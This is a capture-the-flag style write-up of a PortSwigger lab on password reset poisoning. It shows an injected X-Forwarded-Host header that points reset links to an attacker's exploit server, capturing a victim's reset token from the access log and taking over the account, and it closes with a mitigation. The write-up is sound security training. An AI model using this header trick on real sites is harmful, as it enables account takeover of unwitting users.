# Lab 13 — Password reset poisoning via middleware

> **Expert** · [Official lab](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)

**Entry point:** the reset email's link is built from the `Host` header —
`X-Forwarded-Host` is honored.

## Solution

1. `POST /forgot-password` in Repeater; add:

```http
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

with `username=carlos`.

2. The victim's reset email (automatically read) links to **your** domain —
   the exploit server access log captures
   `/forgot-password?temp-forgot-password-token=VICTIM-TOKEN`.
3. Take the *legit* reset URL from your own email and swap in the victim's
   token; set a new password for carlos.
4. Log in as carlos — lab solved.

## Mitigation

Build reset links from server configuration, never from `Host`/
`X-Forwarded-*` headers.
